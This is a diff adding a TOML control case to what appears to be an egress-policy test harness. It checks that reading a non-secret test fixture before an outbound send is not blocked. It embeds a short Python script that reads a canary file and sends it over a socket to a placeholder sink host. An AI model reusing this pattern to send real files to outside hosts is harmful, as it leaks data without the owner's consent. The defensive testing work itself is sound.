@@ -1,0 +1,28 @@
+# A control: only the `secret` class gates egress. Reading a `tests`-class
+# fixture before an external post must not be treated as a secret read, so the
+# canary reaches the sink.
+name = "control-tests-read-then-egress"
+kind = "control"
+policy = "recommended"
+
+[[files]]
+path = "tests/fixtures/sample.txt"
+contents = "marker={CANARY}\n"
+
+[[files]]
+path = "send.py"
+contents = """
+import socket
+data = open("tests/fixtures/sample.txt", "rb").read()
+s = socket.socket()
+s.connect(("{SINK_HOST}", {SINK_PORT}))
+s.sendall(data)
+"""
+
+[[steps]]
+shell = 0
+run = "python3 send.py"
+expect = "accepted"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
